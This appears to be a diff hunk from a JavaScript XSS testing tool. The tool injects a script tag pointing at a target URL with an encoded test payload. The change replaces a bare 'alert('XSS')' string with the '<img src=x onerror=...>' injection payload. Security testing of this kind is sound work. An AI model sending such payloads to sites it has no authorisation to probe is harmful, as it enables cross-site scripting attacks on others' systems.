@@ -151,7 +151,7 @@
         return;
       }
       const script = document.createElement("script");
-      const payload = encodeURIComponent("alert('XSS')");
+      const payload = encodeURIComponent("<img src=x onerror=alert('XSS')>");
       script.src = targetUrl + "/?test=" + payload;
       document.body.appendChild(script);
       log("Injected script src: " + script.src);
